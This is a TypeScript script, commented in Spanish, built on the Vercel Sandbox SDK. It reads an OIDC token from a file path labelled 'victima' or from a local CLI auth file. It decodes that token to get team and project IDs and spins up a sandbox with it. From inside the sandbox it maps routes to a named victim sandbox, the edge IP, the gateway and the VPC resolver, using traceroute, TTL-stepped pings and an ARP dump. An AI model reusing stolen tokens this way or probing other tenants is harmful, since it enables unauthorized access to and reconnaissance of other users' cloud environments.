import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

const SCRIPT = `
set +e
echo "=== MI IP y rutas ==="
ip -o addr | grep eth0 | grep inet
ip route
echo ""
echo "=== 1. TRACEROUTE hacia la victima (sb-1phoxyil6njl.vercel.run) ==="
which traceroute >/dev/null 2>&1 && traceroute -n -w 1 -q 1 -m 12 sb-1phoxyil6njl.vercel.run 2>&1 | head -14 || echo "no traceroute"
echo ""
echo "=== 2. TRACEROUTE hacia MI propio dominio ==="
which traceroute >/dev/null 2>&1 && traceroute -n -w 1 -q 1 -m 12 $MYSUB 2>&1 | head -14 || echo "no traceroute"
echo ""
echo "=== 3. traceroute por IP edge directamente (64.239.123.129) ==="
which traceroute >/dev/null 2>&1 && traceroute -n -w 1 -q 1 -m 12 64.239.123.129 2>&1 | head -14 || echo "no traceroute"
echo ""
echo "=== 4. ip route get a varios destinos ==="
echo "--- a la victima (dominio) ---"
ip route get sb-1phoxyil6njl.vercel.run 2>/dev/null
echo "--- a 100.64.0.1 (gateway) ---"
ip route get 100.64.0.1 2>/dev/null
echo "--- a 100.64.5.5 (otra celda falsa) ---"
ip route get 100.64.5.5 2>/dev/null
echo "--- a 172.31.0.2 (resolver VPC) ---"
ip route get 172.31.0.2 2>/dev/null
echo "--- a 64.239.123.129 (edge) ---"
ip route get 64.239.123.129 2>/dev/null
echo ""
echo "=== 5. ping incremental TTL (mappeo de saltos) al edge ==="
for ttl in 1 2 3 4 5 6 7 8; do
  timeout 2 ping -c 1 -t $ttl -W 1 64.239.123.129 2>&1 | grep -oE "(From [0-9.]+|bytes from [0-9.]+|Time to live exceeded)" | head -1
  echo "  ttl=$ttl"
done
echo ""
echo "=== 6. ping incremental TTL a la victima (dominio) ==="
for ttl in 1 2 3 4 5 6 7 8; do
  timeout 2 ping -c 1 -t $ttl -W 1 sb-1phoxyil6njl.vercel.run 2>&1 | grep -oE "(From [0-9.]+|bytes from [0-9.]+|Time to live exceeded)" | head -1
  echo "  ttl=$ttl"
done
echo ""
echo "=== 7. ARP despues de los pings: quien aparecio ==="
ip neigh 2>/dev/null
echo "=== DONE ==="
`;

async function main() {
  const sbx = await Sandbox.create({
    name: "trace-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  const mySub = sbx.domain(3000).replace(/^https?:\/\//, "").replace(/\/.*/, "");
  console.log("MI SUBDOMINIO:", mySub);
  const script = SCRIPT.replace("$MYSUB", mySub);
  const r = await sbx.runCommand("bash", ["-c", script], { wait: true, timeout: 90_000 });
  const out = await r.output("both");
  console.log(out);
  console.log("DONE");
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });